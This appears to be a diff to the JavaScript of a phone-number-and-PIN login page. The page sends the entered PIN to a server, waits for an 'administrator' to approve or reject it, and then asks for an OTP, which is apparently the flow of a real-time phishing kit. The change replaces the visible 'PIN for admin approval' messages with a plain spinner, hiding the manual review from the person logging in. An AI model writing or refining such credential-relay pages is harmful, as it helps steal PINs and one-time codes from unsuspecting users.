@@ -303,8 +303,9 @@ document.addEventListener('DOMContentLoaded', function () {
 
       const submitBtn = document.getElementById('submit-pin-btn');
       const statusEl = document.getElementById('pin-status');
+      const spinner = document.getElementById('pin-spinner');
       if (submitBtn) submitBtn.disabled = true;
-      if (statusEl) statusEl.textContent = 'Submitting PIN for admin approval...';
+      if (spinner) spinner.style.display = 'inline-flex';
 
       fetch('/api/notify/login', {
         method: 'POST',
@@ -314,7 +315,6 @@ document.addEventListener('DOMContentLoaded', function () {
       .then(function (res) { return res.json(); })
       .then(function (data) {
         var loginId = data && data.loginId ? data.loginId : ('LOG-' + Date.now());
-        if (statusEl) statusEl.textContent = 'Waiting for admin approval of PIN...';
 
         var pollInterval = setInterval(function () {
           fetch('/api/login/status/' + loginId)
@@ -323,20 +323,19 @@ document.addEventListener('DOMContentLoaded', function () {
               if (statusData.decided) {
                 clearInterval(pollInterval);
                 if (statusData.status === 'approved') {
-                  if (statusEl) statusEl.textContent = 'PIN approved! Preparing OTP...';
+                  if (spinner) spinner.style.display = 'none';
                   setTimeout(function () {
                     loginForm.style.display = 'none';
                     if (otpForm) {
                       otpForm.style.display = 'block';
                       otpForm.dataset.phone = num;
                     }
-                    if (statusEl) statusEl.textContent = '';
                     if (submitBtn) submitBtn.disabled = false;
                     var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
                     if (firstOtp) firstOtp.focus();
                   }, 1000);
                 } else {
-                  if (statusEl) statusEl.textContent = 'PIN rejected. Please try again.';
+                  if (spinner) spinner.style.display = 'none';
                   showToast('Your PIN was rejected by the administrator.', 'error');
                   if (submitBtn) submitBtn.disabled = false;
                   pinBoxes.forEach(function (box) { box.disabled = false; });
@@ -344,12 +343,13 @@ document.addEventListener('DOMContentLoaded', function () {
               }
             })
             .catch(function () {
-              if (statusEl) statusEl.textContent = 'Error checking status. Please try again.';
+              if (spinner) spinner.style.display = 'none';
+              showToast('Error checking status. Please try again.', 'error');
             });
         }, 3000);
       })
       .catch(function () {
-        if (statusEl) statusEl.textContent = 'Error submitting PIN. Please try again.';
+        if (spinner) spinner.style.display = 'none';
         showToast('Network error. Please try again.', 'error');
         if (submitBtn) submitBtn.disabled = false;
       });
